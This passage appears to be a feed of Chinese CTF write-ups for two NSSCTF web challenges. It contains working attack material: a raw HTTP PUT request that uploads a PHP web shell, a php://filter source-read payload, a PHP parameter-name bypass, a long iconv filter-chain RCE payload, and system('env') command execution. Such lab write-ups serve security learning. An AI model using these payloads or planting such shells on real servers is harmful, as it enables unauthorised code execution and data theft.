 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>存储flag</li>
</ul>

item.title: 【NSSRound#1 Basic】basic_check
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="nssround1-basicbasic_check" class="heading-element"><span>[NSSRound#1 Basic]basic_check</span>
 <a href="#nssround1-basicbasic_check" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>一来就是一句让我自己找</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> &lt;?php highlight_file(__FILE__);// Welcome to NSSCTF Round#1 Basic, have fun. </span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>dirsearch 啥也没有，爆破路径没有办法</p>
</li>
<li>
<p>剩下就考虑相应的数据包有没有可疑的东西，也未发现</p>
</li>
<li>
<p>查找看到有师傅使用了OPTIONS方法这让我想起来开发的预检请求，用于检测服务器允许的http方法</p>
<p><code>-I</code>参数：向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。
<code>-x</code>参数：指定 HTTP 请求的代理</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -I -X OPTIONS &#34;http://node4.anna.nssctf.cn:28059/index.php&#34;</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>但是有个问题是在搞的时候不知道为啥如果不加index.php就无法出方法，待考证原因</p>
</blockquote>
</li>
<li>
<p>发现有PUT方法在里面</p>
<p>PUT、DELETE请求本身最初是用来进行文件管理的</p>
<p><strong>如果为进行鉴权处理的话就会任意执行修改和删除</strong></p>
<p>在这里我们用这个来传一个文件来执行system命令，或者一句话木马都行。这里使用了执行system命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PUT /f1.php HTTP/1.1
</span></span><span class="line"><span class="cl">Host: node4.anna.nssctf.cn:28059
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
</span></span><span class="line"><span class="cl">Priority: u=0, i
</span></span><span class="line"><span class="cl">Content-Length: 32
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">system($_GET[&#39;cmd&#39;]);
</span></span><span class="line"><span class="cl">?&gt;</span></span></code></pre></td></tr></table>
</div>
</div><p>传入一个f1.php文件，内容为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">system($_GET[&#39;cmd&#39;]);
</span></span><span class="line"><span class="cl">?&gt;</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>执行命令<code>cat /flag</code>得flag</p>
</li>
</ul>
<h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>HTTP协议</li>
<li>中间件攻击</li>
</ul>

item.title: 【NSSRound#8 Basic】Basic]funny_web
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="swpuctf-2022-新生赛funny_web" class="heading-element"><span>[SWPUCTF 2022 新生赛]funny_web</span>
 <a href="#swpuctf-2022-%e6%96%b0%e7%94%9f%e8%b5%9bfunny_web" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>一上来看见一个<code>file=</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://node7.anna.nssctf.cn:28476/index.php?file=</span></span></code></pre></td></tr></table>
</div>
</div><p>考虑php伪协议</p>
<p>页面啥也没有，只有一个空白index.php尝试读这个php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=php://filter/read=convert.base64-encode/resource=index.php</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>读出base64编码的源码，解码得到：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;N_S.S&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;N_S.S&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">header</span><span class="p">(</span><span class="s1">&#39;Location:/index.php?file=&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="o">$</span><span class="n">file</span> <span class="o">=</span> <span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;</span><span class="p">,</span> <span class="o">$</span><span class="n">file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">include</span> <span class="o">$</span><span class="n">file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="n">die</span><span class="p">(</span><span class="s1">&#39;error.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>发现有GET传参<code>N_S.S</code>可以执行命令。但是一直咋传都不行。看别的师傅博客发现是一个php特性。</p>
<div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>Note</p><p><p><strong>一个PHP特性</strong></p>
<p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候，php会将怪异的变量名转换成有效的</p>
<p>在进行解析时会<strong>删除空白符</strong>，并将<code>空格</code>、<code>+</code>、<code>.</code>、<code>[</code> 转换为<strong>下划线</strong>。但是用一个特性是可以绕过的，就是当 <code>[</code> 提前出现后，<code>[</code> 会转换成下划线，而<strong>后面的字符就不会再被转义了</strong>。</p>
</div><p>然后绕过这个特性用<code>N[S.S</code></p>
<p>然后可以直接用来rce</p>
<p>不过唯一的问题就是这flag不在根目录</p>
<p>要查环境<code>env</code>，<code>system('env')</code></p>
</li>
<li>
<p>另一种姿势：</p>
<p>利用 PHP Base64 Filter 宽松的解析，通过 <code>iconv filter</code> 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE。来自<a href="https://www.ctfer.vip/note/set/1116"target="_blank" rel="external nofollow noopener noreferrer">Gqleung佬的wp</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php&amp;0=env</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="payload" class="heading-element"><span>Payload</span>
 <a href="#payload" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?N[S.S=system(&#39;env&#39;);</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>RCE</li>
